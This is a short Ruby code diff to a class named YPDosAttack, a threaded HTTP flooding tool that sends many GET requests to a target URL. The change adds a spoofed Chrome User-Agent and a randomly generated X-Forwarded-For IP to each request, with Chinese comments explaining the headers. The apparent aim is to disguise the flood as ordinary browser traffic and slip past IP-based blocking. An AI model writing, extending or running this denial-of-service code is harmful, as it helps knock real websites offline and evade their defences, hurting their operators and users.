@@ -26,7 +26,14 @@ class YPDosAttack
         n.times do |i|
           threads << Thread.new do
             begin
-              response = Net::HTTP.get_response(uri)
+              req = Net::HTTP::Get.new(uri)
+              req['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3' # 添加 User-Agent 请求头
+              ip_address = Array.new(4) { rand(256) }.join('.')
+              req['X-Forwarded-For'] = ip_address
+              # req['X-Forwarded-For'] = '192.168.0.1' # 将 X-Forwarded-For 请求头设置为你想要使用的 IP 地址
+              response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
+                http.request(req)
+              end
               mutex.synchronize do
                 if response.is_a?(Net::HTTPSuccess)
                   success_count += 1
